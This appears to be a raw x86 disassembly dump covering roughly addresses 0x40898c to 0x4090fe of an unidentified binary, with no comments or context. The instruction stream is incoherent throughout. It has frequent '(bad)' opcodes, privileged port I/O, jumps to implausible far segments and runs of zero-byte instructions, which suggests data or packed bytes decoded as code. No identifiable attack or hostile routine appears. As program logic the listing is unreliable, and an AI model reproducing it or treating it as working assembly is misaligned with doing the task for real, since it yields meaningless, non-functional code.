  40898c:	stos   DWORD PTR es:[edi],eax
  40898d:	add    al,BYTE PTR [ecx]
  40898f:	idiv   DWORD PTR [edi+0x2]
  408992:	ret    
  408993:	mov    bl,0xa0
  408995:	mov    al,0xb4
  408997:	(bad)  
  408998:	dec    ebx
  408999:	cli    
  40899a:	pushf  
  40899b:	mov    edx,0xb79abb42
  4089a0:	dec    ecx
  4089a1:	bnd jmp DWORD PTR [esi-0x54bff8e8]
  4089a8:	adc    cl,dl
  4089aa:	pop    es
  4089ab:	jmp    0x4089ae
  4089ad:	or     DWORD PTR [eax],eax
  4089af:	push   edi
  4089b0:	dec    ecx
  4089b1:	jns    0x408952
  4089b3:	js     0x4089fb
  4089b5:	sub    al,0x83
  4089b7:	jbe    0x408a27
  4089b9:	jne    0x40893e
  4089bb:	pusha  
  4089bc:	das    
  4089bd:	mov    DWORD PTR [ebx-0x737cc99c],ecx
  4089c3:	pusha  
  4089c4:	jmp    0x3e9e1346
  4089c9:	mov    DWORD PTR [edi-0x7e82084b],ebx
  4089cf:	xchg   esp,eax
  4089d0:	add    BYTE PTR [eax],al
  4089d2:	add    BYTE PTR [eax],al
  4089d4:	add    BYTE PTR [edi+0xd],ah
  4089d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089d8:	shl    DWORD PTR [esi+0x2],cl
  4089db:	add    BYTE PTR [edi],bl
  4089dd:	and    DWORD PTR [eax-0x18e1af9a],esp
  4089e3:	jp     0x408a33
  4089e5:	push   esi
  4089e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089e7:	imul   ecx,DWORD PTR [esi+edx*1-0x21],0x6a
  4089ec:	ss repz xchg edi,eax
  4089ef:	jbe    0x4089d6
  4089f1:	in     al,dx
  4089f2:	xchg   ecx,eax
  4089f3:	jo     0x408a0c
  4089f5:	loope  0x408984
  4089f7:	pmulhw mm4,QWORD PTR gs:[edx+0x134267d]
  4089ff:	add    BYTE PTR [ebx-0x4d3ed24e],dl
  408a05:	lods   eax,DWORD PTR ds:[esi]
  408a06:	inc    ebx
  408a07:	test   BYTE PTR [esi-0x6d30c253],ch
  408a0d:	mov    ah,0x87
  408a0f:	ret    
  408a10:	cmp    al,0x80
  408a12:	inc    eax
  408a13:	shl    DWORD PTR [edi*1+0x767cc03f],cl
  408a1a:	add    al,BYTE PTR [eax]
  408a1c:	clc    
  408a1d:	(bad)  
  408a1e:	shl    BYTE PTR [edi],cl
  408a20:	add    dl,ch
  408a22:	sub    eax,0x397a2463
  408a27:	sub    al,0x28
  408a29:	jbe    0x408a5b
  408a2b:	imul   ebp,DWORD PTR [eax],0x76
  408a2e:	xor    BYTE PTR [edx],dh
  408a30:	and    al,0xbe
  408a32:	cs das 
  408a34:	jnp    0x408a02
	...
  408a3e:	gs fadd st,st(0)
  408a41:	xchg   esp,eax
  408a42:	push   0xffffffcd
  408a44:	ffree  st(5)
  408a46:	push   esp
  408a47:	rcr    DWORD PTR [ecx+edx*8-0x352a2d7e],cl
  408a4e:	or     BYTE PTR [ecx+0x5b00000],0x1e
  408a55:	or     BYTE PTR [esi+0x18],bh
  408a58:	adc    bl,BYTE PTR [edi]
  408a5a:	mov    ds,WORD PTR [eax]
  408a5c:	add    bl,BYTE PTR [esi]
  408a5e:	js     0x408a69
  408a60:	adc    al,BYTE PTR [edx+ecx*4]
  408a63:	sbb    BYTE PTR ds:0x91a5e07,cl
  408a69:	add    BYTE PTR [ebx+0x1e],bh
  408a6c:	xor    al,0x23
  408a6e:	push   ebp
  408a6f:	das    
  408a70:	aaa    
  408a71:	xor    al,0x75
  408a73:	das    
  408a74:	daa    
  408a75:	xor    eax,0x2f383653
  408a7a:	inc    ecx
  408a7b:	xor    al,0x24
  408a7d:	xor    eax,0x4c
  408a82:	fstp   TBYTE PTR [esi-0x2efa3c2c]
  408a88:	fcom   st(4)
  408a8a:	jmp    ebx
  408a8c:	fcmovbe st,st(5)
  408a8e:	sti    
  408a8f:	fcom   st(1)
  408a91:	leave  
  408a92:	in     eax,dx
  408a93:	cli    
  408a94:	mov    ah,0x4e
  408a97:	(bad)  
  408a98:	(bad)  
  408a99:	inc    DWORD PTR ds:0x750d1afe
  408a9f:	add    al,0xf5
  408aa1:	adc    al,0x0
  408aa3:	add    BYTE PTR [eax],al
  408aa5:	add    BYTE PTR [eax],al
  408aa7:	mov    ebx,DWORD PTR [edx]
  408aa9:	add    BYTE PTR [edi],dl
  408aab:	test   DWORD PTR [esi],esi
  408aad:	in     eax,0x0
  408aaf:	mov    esp,DWORD PTR [ecx]
  408ab1:	add    eax,DWORD PTR [eax]
  408ab3:	jne    0x408afa
  408ab5:	mov    ds:0xa45f5575,al
  408aba:	fs dec edi
  408abc:	arpl   WORD PTR [eax-0x6d85c28c],bp
  408ac2:	jnp    0x408b04
  408ac4:	sub    DWORD PTR [ebx],eax
  408ac6:	add    BYTE PTR [ebp+0x15],dh
  408ac9:	sub    bh,dh
  408acb:	popf   
  408acc:	out    0x2c,eax
  408ace:	in     eax,dx
  408acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ad0:	jecxz  0x408ae3
  408ad2:	call   FWORD PTR [eax+0x75001613]
  408ad8:	and    DWORD PTR [esi],eax
  408ada:	sbb    bh,BYTE PTR [ecx+0x3]
  408add:	sti    
  408ade:	sbb    eax,0x27fe2a6d
  408ae3:	jno    0x408afa
  408ae5:	clc    
  408ae6:	sbb    edi,DWORD PTR [ecx+0x21]
  408ae9:	add    eax,DWORD PTR [eax]
  408aeb:	jne    0x408aae
  408aed:	xchg   esi,eax
  408aee:	imul   esp,ecx,0xdd6daaeb
  408af4:	fimul  DWORD PTR [esi-0x70422ba9]
  408afa:	dec    DWORD PTR [edx+0x67]
  408afd:	inc    eax
  408afe:	sar    BYTE PTR [ebx],1
  408b00:	test   DWORD PTR [esi+ebx*8],esi
  408b03:	sbb    dl,BYTE PTR [ebp+0x2e]
  408b06:	fadd   DWORD PTR [edx+0x7d]
  408b09:	dec    ebx
  408b0a:	fadd   QWORD PTR [eax]
  408b0c:	add    BYTE PTR [eax],al
  408b0e:	add    BYTE PTR [eax],al
  408b10:	inc    eax
  408b11:	push   ecx
  408b12:	xor    eax,eax
  408b14:	jne    0x408b1f
  408b16:	lahf   
  408b17:	jno    0x408aaa
  408b19:	fist   DWORD PTR [edx-0x6ff46f85]
  408b1f:	jns    0x408ab9
  408b21:	add    ch,BYTE PTR [edi-0x175b7f6a]
  408b27:	add    esi,DWORD PTR [ebp+0x2]
  408b2a:	xor    dh,BYTE PTR [edi]
  408b2c:	mov    esp,0xc5455432
  408b31:	inc    ebp
  408b32:	sub    al,0x31
  408b34:	lds    eax,FWORD PTR [ecx-0x17]
  408b37:	add    esi,DWORD PTR [ebp+0x2]
  408b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b3b:	int3   
  408b3c:	cs enter 0xb1c8,0x24
  408b41:	mov    bh,0xc4
  408b43:	scas   eax,DWORD PTR es:[edi]
  408b44:	sub    eax,DWORD PTR [edx]
  408b46:	inc    esp
  408b47:	popa   
  408b48:	add    ah,BYTE PTR [ecx+0x62]
  408b4b:	push   esp
  408b4c:	out    0x5d,al
  408b4e:	cmp    eax,0xe95fe06a
  408b53:	add    esi,DWORD PTR [ebp+0x2]
  408b56:	out    0xf1,eax
  408b58:	pop    ecx
  408b59:	std    
  408b5a:	jecxz  0x408b66
  408b5c:	ja     0x408b38
  408b5e:	fcomi  st,st(4)
  408b60:	jnp    0x408b6c
  408b62:	add    bl,bh
  408b64:	outs   dx,DWORD PTR ds:[esi]
  408b65:	add    al,BYTE PTR [edi-0x7ba327ae]
  408b6b:	imul   edx,DWORD PTR [edi],0x1b67806b
  408b71:	ja     0x408b01
  408b73:	ins    BYTE PTR es:[edi],dx
  408b74:	add    BYTE PTR [eax],al
  408b76:	add    BYTE PTR [eax],al
  408b78:	add    BYTE PTR [edx],ch
  408b7a:	dec    ebx
  408b7b:	jle    0x408bde
  408b7d:	and    esp,DWORD PTR [ebx-0x17]
  408b80:	add    esi,DWORD PTR [ebp+0x2]
  408b83:	ja     0x408bdf
  408b85:	pop    ss
  408b86:	jnp    0x408be9
  408b88:	pop    edi
  408b89:	sbb    esp,DWORD PTR [esi+0x54]
  408b8c:	push   ecx
  408b8d:	add    DWORD PTR [ebp+0x52],ecx
  408b90:	addr16 clc 
  408b92:	push   eax
  408b93:	inc    ebx
  408b94:	pusha  
  408b95:	rcr    DWORD PTR [ebp+0x4c],1
  408b98:	add    al,0x75
  408b9a:	add    ah,BYTE PTR [ecx+0x292930]
  408ba0:	lahf   
  408ba1:	mov    esp,0x4292cd3a
  408ba6:	sub    al,0xd4
  408ba8:	cmp    al,0xb4
  408baa:	sbb    eax,0x3b392ad1
  408baf:	retf   
  408bb0:	sub    edi,DWORD PTR [edi]
  408bb2:	add    al,BYTE PTR [eax]
  408bb4:	arpl   WORD PTR [ebx+0x70],bp
  408bb7:	mov    ah,0x77
  408bb9:	sti    
  408bba:	push   ebx
  408bbb:	popf   
  408bbc:	fs in  eax,dx
  408bbe:	jg     0x408b55
  408bc0:	push   0x64000279
  408bc5:	(bad)  
  408bc6:	jae    0x408b83
  408bc8:	push   0x728150f6
  408bcd:	out    dx,eax
  408bce:	add    al,BYTE PTR [eax]
  408bd0:	jmp    0x7c:0xf93cf979
  408bd7:	or     bl,ah
  408bd9:	stos   BYTE PTR es:[edi],al
  408bda:	sti    
  408bdb:	add    eax,0xe8
  408be0:	add    BYTE PTR [eax],al
  408be2:	jbe    0x408be6
  408be4:	add    BYTE PTR [eax+0x5],ah
  408be7:	dec    ebp
  408be8:	xchg   edi,eax
  408be9:	data16 test BYTE PTR [ecx+0x276838e],0x0
  408bf1:	dec    edx
  408bf2:	jecxz  0x408ba6
  408bf4:	jnp    0x408c3f
  408bf6:	or     eax,0x7426e8f
  408bfb:	test   eax,0x2f9da7ff
  408c00:	fstp   DWORD PTR [esi-0x5f10d168]
  408c06:	test   DWORD PTR [edi],esi
  408c08:	rcl    DWORD PTR [esi-0x7ffc950],1
  408c0e:	inc    ebx
  408c0f:	not    BYTE PTR [esi]
  408c11:	stc    
  408c12:	dec    eax
  408c13:	cmc    
  408c14:	push   DWORD PTR [edx-0x6031c495]
  408c1a:	push   esi
  408c1b:	ins    BYTE PTR es:[edi],dx
  408c1c:	int    0x0
  408c1e:	or     DWORD PTR [eax-0x6e431241],esp
  408c24:	test   bl,al
  408c26:	xchg   edx,eax
  408c27:	mov    BYTE PTR [ebx-0x760e1b68],bl
  408c2d:	sahf   
  408c2e:	and    eax,0xd94fd28c
  408c34:	(bad)  
  408c35:	push   esi
  408c37:	stos   BYTE PTR es:[edi],al
  408c38:	stos   BYTE PTR es:[edi],al
  408c39:	stos   BYTE PTR es:[edi],al
  408c3a:	fadd   QWORD PTR [eax+eax*1]
  408c3d:	add    BYTE PTR [edi+ebp*1+0x31],ch
  408c41:	and    al,0x74
  408c43:	cmp    BYTE PTR [ecx],bh
  408c45:	add    BYTE PTR es:[eax],al
  408c48:	add    BYTE PTR [eax],al
  408c4a:	add    BYTE PTR [edi],cl
  408c4c:	sub    al,0x26
  408c4e:	cmp    ebx,esp
  408c50:	add    al,0x0
  408c52:	add    BYTE PTR [edi+0x14],dh
  408c55:	imul   ebp,DWORD PTR [ebx-0x21],0xa9ffff1d
  408c5c:	or     al,0x16
  408c5e:	pop    es
  408c5f:	pushf  
  408c60:	add    al,0x0
  408c62:	add    BYTE PTR [esi-0x1f],ah
  408c65:	(bad)  
  408c66:	stos   BYTE PTR es:[edi],al
  408c67:	mov    WORD PTR [eax+eax*1],es
  408c6a:	add    BYTE PTR [esi+esi*8-0x1c],bh
  408c6e:	loopne 0x408c0c
  408c70:	add    al,0x0
  408c72:	add    BYTE PTR [ebx],al
  408c74:	(bad)  
  408c75:	out    dx,al
  408c76:	loop   0x408c37
  408c78:	leave  
  408c79:	rol    bh,0x2b
  408c7c:	(bad)  
  408c7e:	(bad)  
  408c7f:	sub    al,0xd6
  408c81:	fcomp  st(6)
  408c83:	add    dl,cl
  408c85:	into   
  408c86:	iret   
  408c87:	dec    esp
  408c88:	add    al,0x0
  408c8a:	add    al,dh
  408c8c:	xchg   DWORD PTR [edx+eiz*4+0x837ca6],ebp
  408c93:	mov    BYTE PTR [edi],bl
  408c95:	xor    edi,DWORD PTR [edx]
  408c97:	dec    eax
  408c98:	adc    eax,0x2775191b
  408c9d:	cmc    
  408c9e:	push   es
  408c9f:	lds    ebx,FWORD PTR [ecx]
  408ca1:	add    eax,DWORD PTR [eax]
  408ca3:	jne    0x408c85
  408ca5:	repz ds popa 
  408ca8:	ss add eax,0xfd3d4f16
  408cae:	add    al,0x0
  408cb0:	add    BYTE PTR [eax],al
  408cb2:	add    BYTE PTR [eax],al
  408cb4:	jns    0x408ccf
  408cb6:	add    eax,DWORD PTR [eax]
  408cb8:	jne    0x408d08
  408cba:	add    eax,0xa0a552d
  408cbf:	add    BYTE PTR [edi+0x75000323],al
  408cc5:	outs   dx,DWORD PTR ds:[esi]
  408cc6:	in     al,dx
  408cc7:	push   edx
  408cc8:	push   edi
  408cc9:	aas    
  408cca:	rol    BYTE PTR [edi],1
  408ccc:	jnp    0x408d04
  408cce:	or     dl,BYTE PTR [ebx]
  408cd0:	das    
  408cd1:	pusha  
  408cd2:	(bad)  
  408cd3:	adc    eax,0x5c027f2b
  408cd8:	outs   dx,BYTE PTR ds:[esi]
  408cd9:	outs   dx,BYTE PTR ds:[esi]
  408cda:	call   0x841f:0x3176a27
  408ce1:	adc    esi,esi
  408ce3:	dec    esi
  408ce4:	inc    ecx
  408ce5:	(bad)  
  408ce6:	retf   
  408ce7:	inc    edx
  408ce8:	xor    al,0x28
  408cea:	loop   0x408d29
  408cec:	pop    edx
  408ced:	push   ebp
  408cee:	loopne 0x408d22
  408cf0:	pop    ecx
  408cf1:	xchg   esi,eax
  408cf2:	test   al,0x5f
  408cf4:	inc    edx
  408cf5:	push   0x3
  408cf7:	add    BYTE PTR [ebp+0x26],dh
  408cfa:	pop    ebp
  408cfb:	fwait
  408cfc:	mov    ebp,0x24ab5570
  408d01:	jge    0x408d17
  408d03:	mov    esp,0xec537227
  408d08:	push   0x36
  408d0a:	dec    ebp
  408d0b:	shr    bl,0x39
  408d0e:	arpl   WORD PTR [edi-0x1df17ae5],bp
  408d14:	push   ebx
  408d15:	cwde   
  408d16:	inc    ecx
  408d17:	add    BYTE PTR [eax],al
  408d19:	add    BYTE PTR [eax],al
  408d1b:	add    BYTE PTR [eax],al
  408d1d:	jne    0x408d21
  408d1f:	rcr    cl,1
  408d21:	mov    ds,ecx
  408d23:	(bad)  
  408d24:	int    0x85
  408d26:	out    dx,al
  408d27:	icebp  
  408d28:	repnz pop ebx
  408d2a:	sar    dl,cl
  408d2c:	idiv   BYTE PTR [eax-0xe]
  408d2f:	fucomip st,st(3)
  408d31:	sbb    cl,BYTE PTR [edi]
  408d33:	jmp    0x408d19
  408d35:	push   esp
  408d36:	fistp  QWORD PTR [edx-0x1c14ba25]
  408d3c:	ficom  WORD PTR [esi-0x23]
  408d3f:	call   0x1430247
  408d44:	aad    0x96
  408d46:	in     eax,0x18
  408d48:	(bad)  [eax-0x6d2cf10d]
  408d4e:	(bad)  
  408d50:	(bad)  
  408d52:	push   cs
  408d53:	out    0xcc,eax
  408d55:	xchg   ecx,eax
  408d56:	fdiv   st,st(2)
  408d58:	out    0x96,al
  408d5a:	cwde   
  408d5b:	rcl    esp,cl
  408d5d:	xchg   ecx,eax
  408d5e:	iret   
  408d5f:	mov    ds:0xcbd778f4,eax
  408d64:	add    esi,DWORD PTR [ebp+0x2]
  408d67:	popa   
  408d68:	pop    edx
  408d69:	out    0x49,al
  408d6b:	push   ebp
  408d6c:	pusha  
  408d6d:	iret   
  408d6e:	or     DWORD PTR [ebx+0x5a],esp
  408d71:	(bad)  [ecx-0x17]
  408d74:	add    esi,DWORD PTR [ebp+0x2]
  408d77:	test   al,0xfb
  408d79:	and    BYTE PTR [ecx],al
  408d7b:	jmp    0xaf430283
  408d80:	pop    ss
  408d81:	add    BYTE PTR [eax],al
  408d83:	add    BYTE PTR [eax],al
  408d85:	add    BYTE PTR [esi+0x23],bh
  408d88:	jmp    0x8d430290
  408d8d:	xchg   BYTE PTR [edi],cl
  408d8f:	test   DWORD PTR [edi+0x36],esi
  408d92:	push   ss
  408d93:	outs   dx,BYTE PTR ds:[esi]
  408d94:	pop    ecx
  408d95:	jle    0x408e0c
  408d97:	add    bl,BYTE PTR [ecx]
  408d99:	lahf   
  408d9a:	fist   DWORD PTR [esi-0x6ae3c701]
  408da0:	pusha  
  408da1:	push   ss
  408da2:	sub    al,0xae
  408da4:	push   0x24
  408da6:	push   ss
  408da7:	nop
  408da8:	bound  edx,QWORD PTR [edi+ebx*8]
  408dab:	mov    esi,0x92f91746
  408db0:	jp     0x408daf
  408db2:	dec    edx
  408db4:	push   ebx
  408db5:	(bad)  
  408db6:	(bad)  
  408db7:	xchg   ebp,eax
  408db8:	cmp    ecx,DWORD PTR [edi]
  408dba:	cmp    dh,al
  408dbc:	dec    ebx
  408dbd:	jmp    0xf6409038
  408dc2:	ror    ch,0x52
  408dc5:	mov    esi,0xd945be36
  408dca:	push   ss
  408dcb:	lds    ecx,FWORD PTR [ebx-0x4d]
  408dce:	mov    esp,0xb7bb43aa
  408dd3:	fwait
  408dd4:	pop    edi
  408dd5:	mov    al,ds:0xb25bb825
  408dda:	mov    ah,0xef
  408ddc:	jno    0x408d6e
  408dde:	push   es
  408ddf:	mov    eax,0x40362aff
  408de4:	iret   
  408de5:	cmp    edi,DWORD PTR [ecx+0x33]
  408de8:	fild   QWORD PTR [eax+0x0]
  408deb:	add    BYTE PTR [eax],al
  408ded:	add    BYTE PTR [eax],al
  408def:	ins    BYTE PTR es:[edi],dx
  408df0:	test   edi,eax
  408df2:	and    esi,DWORD PTR [esp+edi*1]
  408df5:	iret   
  408df6:	sub    eax,0xe9c42d2c
  408dfb:	jbe    0x408dff
  408dfd:	add    BYTE PTR [edi+eax*1+0x6e],al
  408e01:	test   DWORD PTR [eax-0xf],ebp
  408e04:	test   ebp,ecx
  408e06:	inc    esi
  408e07:	adc    BYTE PTR [edx-0x6d],dh
  408e0a:	push   0x2
  408e0c:	jne    0x408e0e
  408e0e:	mov    ebx,0xdff2198f
  408e13:	lea    edx,[edx]
  408e15:	mov    edx,0xe42582b9
  408e1a:	add    BYTE PTR [eax],bl
  408e1c:	out    0xdf,al
  408e1e:	mov    dl,0xf3
  408e20:	out    0xeb,eax
  408e22:	out    0x5,eax
  408e24:	loopne 0x408e13
  408e26:	in     al,0xfd
  408e28:	jmp    0xc1548e2c
  408e2d:	ret    
  408e2e:	iret   
  408e2f:	(bad)  
  408e31:	fmul   QWORD PTR [edi-0x30353f0f]
  408e37:	cwde   
  408e38:	jmp    0xded2:0xc7fdc4c2
  408e3f:	out    dx,al
  408e40:	(bad)  
  408e41:	int3   
  408e42:	add    BYTE PTR [edi+0x52bcb4bf],ch
  408e48:	xchg   edi,eax
  408e49:	mov    bl,0xb5
  408e4b:	loopne 0x408e0b
  408e4d:	scas   al,BYTE PTR es:[edi]
  408e4e:	scas   al,BYTE PTR es:[edi]
  408e4f:	cmc    
  408e50:	mov    ah,0xb3
  408e52:	mov    ch,0x0
  408e54:	add    BYTE PTR [eax],al
  408e56:	add    BYTE PTR [eax],al
  408e58:	jmp    DWORD PTR [edi+ebp*4-0x11539e54]
  408e5f:	test   bh,ch
  408e61:	mov    ds:0xa247a1a4,al
  408e66:	stos   DWORD PTR es:[edi],eax
  408e67:	mov    ebx,0xae87852f
  408e6c:	imul   edi,DWORD PTR [ebx-0x53],0xffffffde
  408e70:	push   ebx
  408e71:	sahf   
  408e72:	xchg   edi,eax
  408e73:	(bad)  
  408e74:	xor    ecx,DWORD PTR [ecx-0x88fff76]
  408e7a:	out    dx,al
  408e7b:	add    cl,ah
  408e7d:	push   ebx
  408e7e:	pop    ebp
  408e7f:	pop    edi
  408e80:	aam    0x28
  408e82:	(bad)  
  408e83:	jmp    ecx
  408e85:	jbe    0x408efc
  408e87:	jge    0x408e96
  408e89:	imul   ebp,DWORD PTR [esi+0x3d],0x657d7cdd
  408e90:	sbb    ebp,DWORD PTR [edx+0x5f]
  408e93:	pop    sp
  408e95:	add    BYTE PTR [eax],al
  408e97:	add    BYTE PTR [ebp+0x5],dh
  408e9a:	retf   
  408e9b:	cmp    ch,BYTE PTR [edx+0x7512ea2c]
  408ea1:	jmp    0x55c5:0xeaa845bf
  408ea8:	mov    ch,0xeb
  408eaa:	lds    esp,FWORD PTR [eax-0x31]
  408ead:	frstor [ebx-0x59122882]
  408eb3:	dec    ebx
  408eb4:	mov    ebx,0xc447b8d4
  408eb9:	retf   
  408eba:	mov    dh,0x47
  408ebc:	add    BYTE PTR [eax],al
  408ebe:	add    BYTE PTR [eax],al
  408ec0:	add    BYTE PTR [ebp+0x1aff96ff],bl
  408ec6:	mov    ds:0xc5dda366,al
  408ecb:	push   eax
  408ecc:	mov    edx,0xa1619c1d
  408ed1:	retf   
  408ed2:	ret    
  408ed3:	push   esp
  408ed4:	mov    dl,0x15
  408ed6:	xchg   DWORD PTR [ebp-0x4e],edx
  408ed9:	sub    bl,BYTE PTR [edx]
  408edb:	add    eax,DWORD PTR [eax]
  408edd:	jne    0x408eee
  408edf:	out    dx,al
  408ee0:	inc    eax
  408ee1:	inc    ecx
  408ee2:	push   ecx
  408ee3:	add    eax,DWORD PTR [eax]
  408ee5:	jne    0x408f5c
  408ee7:	addr16 test eax,0xa04f840f
  408eed:	sbb    DWORD PTR [ecx-0x792d4d9b],edx
  408ef3:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ef5:	jne    0x408eb3
  408ef7:	jns    0x408e84
  408ef9:	push   cs
  408efa:	fwait
  408efb:	or     DWORD PTR [ecx-0x437e5f04],0x97859fda
  408f05:	call   0xedd4e9e9
  408f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f0b:	imul   ecx,DWORD PTR [esi-0x48a05c8b],0xaf45ce75
  408f15:	iret   
  408f16:	add    bl,dh
  408f18:	or     DWORD PTR [eax+0x2],ebp
  408f1b:	xor    esp,DWORD PTR [ebx+0x45a8ae9]
  408f21:	jne    0x408f25
  408f23:	jb     0x408f8c
  408f25:	add    BYTE PTR [eax],al
  408f27:	add    BYTE PTR [eax],al
  408f29:	add    BYTE PTR ds:0x135f8f64,dl
  408f2f:	pop    ds
  408f30:	ins    BYTE PTR es:[edi],dx
  408f31:	pop    edx
  408f32:	pop    es
  408f33:	pusha  
  408f34:	jnp    0x408f94
  408f36:	sbb    dl,BYTE PTR [ebx-0x53]
  408f39:	imul   edx,DWORD PTR [ebx],0x5b
  408f3c:	pop    ebp
  408f3d:	push   ebp
  408f3e:	fisttp QWORD PTR [ebx+0x47]
  408f41:	mov    db2,esi
  408f44:	push   esi
  408f45:	dec    ebp
  408f46:	fadd   QWORD PTR [edi+0x60]
  408f49:	ins    DWORD PTR es:[edi],dx
  408f4a:	inc    ecx
  408f4b:	and    eax,0x27549b4
  408f50:	std    
  408f51:	ficom  DWORD PTR [eax+0x2b5c68b]
  408f57:	or     ecx,DWORD PTR [edx+0x6c6bef4b]
  408f5d:	xor    eax,0x197b36c2
  408f62:	jne    0x408f66
  408f64:	fcom   DWORD PTR [esi+0x3e88864]
  408f6a:	jne    0x408f6e
  408f6c:	xor    eax,0xe939c23b
  408f71:	add    esi,DWORD PTR [ebp+0x2]
  408f74:	mov    edx,0x99b336bd
  408f79:	(bad)  
  408f7a:	rcr    BYTE PTR es:[edi+eiz*4-0x3e4145c9],0x49
  408f83:	ret    0xc8be
  408f86:	adc    BYTE PTR [esi-0x55bb5555],ah
  408f8c:	mov    ch,0xb9
  408f8e:	add    BYTE PTR [eax],al
  408f90:	add    BYTE PTR [eax],al
  408f92:	add    BYTE PTR [eax],bl
  408f94:	mov    ch,BYTE PTR [edi-0x57c142]
  408f9a:	xchg   ch,bl
  408f9c:	scas   al,BYTE PTR es:[edi]
  408f9d:	gs ja  0x408f80
  408fa0:	fwait
  408fa1:	addr16 dec edi
  408fa3:	sub    al,ch
  408fa5:	fs popa 
  408fa7:	or     DWORD PTR [esi-0x2be5a3a0],ecx
  408fad:	aas    
  408fae:	pop    eax
  408faf:	push   ss
  408fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fb1:	jge    0x408ff2
  408fb3:	add    ebx,DWORD PTR [ebx-0x6618d8ba]
  408fb9:	jns    0x408f95
  408fbb:	xor    eax,ecx
  408fbd:	adc    eax,0x276e9
  408fc2:	pop    edx
  408fc3:	mov    ds:0xc3839271,al
  408fc8:	imul   ebx,DWORD PTR [eax-0x77965686],0xffffffe9
  408fcf:	jbe    0x408fd3
  408fd1:	add    BYTE PTR [ecx+eiz*2+0x47a4c134],cl
  408fd8:	inc    esp
  408fd9:	aam    0x8b
  408fdb:	addr16 das 
  408fdd:	fisub  WORD PTR [ecx+0x29d63d3d]
  408fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fe4:	or     ch,ah
  408fe6:	sub    eax,0x29d33fa0
  408feb:	lahf   
  408fec:	sub    cl,BYTE PTR [ebp-0x3ad55bc2]
  408ff2:	inc    eax
  408ff3:	call   0x0:0x2fe713
  408ffa:	add    BYTE PTR [eax],al
  408ffc:	xor    al,0x24
  408ffe:	clc    
  408fff:	inc    ecx
  409000:	jae    0x40900b
  409002:	in     al,0xe9
  409004:	jbe    0x409008
  409006:	add    BYTE PTR [esi],bl
  409008:	bound  esi,QWORD PTR [ebx]
  40900a:	rol    DWORD PTR [ebx+0x67],cl
  40900d:	xor    ah,bl
  40900f:	imul   edi,DWORD PTR [ecx+0x2],0x0
  409013:	popf   
  409014:	rcr    BYTE PTR [ebx+0x6cfd0067],1
  40901a:	push   0x0
  40901c:	push   ebx
  40901d:	cld    
  40901e:	out    dx,eax
  40901f:	jecxz  0x409094
  409021:	out    dx,al
  409022:	fcomip st,st(6)
  409024:	dec    esp
  409025:	into   
  409026:	idiv   ah
  409028:	inc    esi
  409029:	out    dx,eax
  40902a:	call   0xda34cf23
  40902f:	into   
  409030:	cmp    dh,al
  409032:	out    0xf1,al
  409034:	cs in  eax,dx
  409036:	stc    
  409037:	scas   eax,DWORD PTR es:[edi]
  409038:	or     esp,esi
  40903a:	stc    
  40903b:	out    0x17,eax
  40903d:	mov    esi,0xe438c5d2
  409042:	(bad)  
  409044:	fcmovne st,st(7)
  409046:	(bad)  
  409047:	sar    DWORD PTR [ebx],1
  409049:	not    dl
  40904b:	xlat   BYTE PTR ds:[ebx]
  40904c:	in     al,dx
  40904d:	(bad)  
  40904e:	rol    DWORD PTR [eax],cl
  409050:	jae    0x409097
  409052:	push   esi
  409053:	inc    ebp
  409054:	push   eax
  409055:	adc    eax,0x56575261
  40905a:	(bad)  
  40905b:	(bad)  
  40905c:	fcomi  st,st(2)
  40905e:	imul   ebx
  409060:	add    BYTE PTR [eax],al
  409062:	add    BYTE PTR [eax],al
  409064:	add    bl,bh
  409066:	cld    
  409067:	out    0xfe,eax
  409069:	aam    0xdc
  40906b:	(bad)  
  40906c:	hlt    
  40906d:	ds mul eax
  409070:	cld    
  409071:	inc    esi
  409072:	cld    
  409073:	rol    esi,1
  409075:	xor    bh,al
  409077:	out    dx,al
  409078:	stc    
  409079:	ss in  eax,0xf1
  40907c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40907d:	mov    eax,ds:0x6feff1fc
  409082:	(bad)  
  409083:	fcmove st,st(5)
  409085:	xor    cl,dh
  409087:	fcmovbe st,st(2)
  409089:	add    ax,0x0
  40908d:	inc    ebx
  40908e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40908f:	mov    ah,0xa3
  409091:	and    eax,0x75b0a59e
  409096:	scas   eax,DWORD PTR es:[edi]
  409097:	psubd  mm3,mm6
  40909a:	(bad)  
  40909b:	push   edx
  40909c:	stos   DWORD PTR es:[edi],eax
  40909d:	jecxz  0x409056
  40909f:	push   ecx
  4090a0:	out    dx,al
  4090a1:	(bad)  
  4090a2:	int3   
  4090a3:	fs mov dh,0xc4
  4090a6:	iret   
  4090a7:	inc    edi
  4090a8:	out    0xd4,al
  4090aa:	mov    ecx,0x8d30a960
  4090af:	outs   dx,DWORD PTR ds:[esi]
  4090b0:	xchg   ebp,eax
  4090b1:	inc    esi
  4090b2:	inc    esp
  4090b3:	xor    edx,esi
  4090b5:	inc    ebp
  4090b6:	mov    ds:0x2d37d12c,eax
  4090bb:	adc    DWORD PTR [ecx-0x408b66fd],ecx
  4090c1:	in     al,0xad
  4090c3:	test   DWORD PTR [edx-0x65829dd0],eax
  4090c9:	add    BYTE PTR [eax],al
  4090cb:	add    BYTE PTR [eax],al
  4090cd:	add    bl,dh
  4090cf:	mov    dl,0x67
  4090d1:	mov    DWORD PTR [edx],edx
  4090d3:	sahf   
  4090d4:	and    esp,esp
  4090d6:	and    eax,0x18e1277e
  4090db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090dc:	push   ds
  4090dd:	stc    
  4090de:	sbb    esi,DWORD PTR [ebp+0x49]
  4090e1:	mov    al,0xd0
  4090e3:	int3   
  4090e4:	pop    ebp
  4090e5:	mov    ebx,0x395f9
  4090ea:	jne    0x40915d
  4090ec:	sub    ecx,edx
  4090ee:	sbb    DWORD PTR [eax-0x233d26d5],edx
  4090f4:	ja     0x40907b
  4090f6:	mov    ebp,0xb0d42fdd
  4090fb:	loopne 0x40912f
  4090fd:	xchg   ecx,eax
  4090fe:	mov    eax,0xa6d032cf
